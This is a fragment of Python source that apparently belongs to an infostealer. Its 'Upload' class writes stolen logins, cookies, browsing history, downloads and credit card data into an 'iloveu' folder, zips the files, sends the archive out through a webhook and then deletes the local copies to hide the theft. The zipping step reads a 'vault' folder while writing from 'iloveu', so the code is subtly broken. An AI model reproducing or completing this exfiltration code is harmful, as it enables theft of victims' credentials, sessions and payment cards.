...
class Upload:
    ...
    def write_files(self):
        os.makedirs("iloveu", exist_ok=True)
        if __LOGINS__:
            with open("iloveu\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("iloveu\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("iloveu\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("iloveu\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("iloveu\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("iloveu.zip", "w") as zip:
            for file in os.listdir("vault"):
                zip.write(f"iloveu\\{file}", file)
    ...
    def send(self):
        self.webhook.send(
            ...
            file=File("iloveu.zip"),
        )

    def clean(self):
        shutil.rmtree("iloveu")
        os.remove("iloveu.zip")
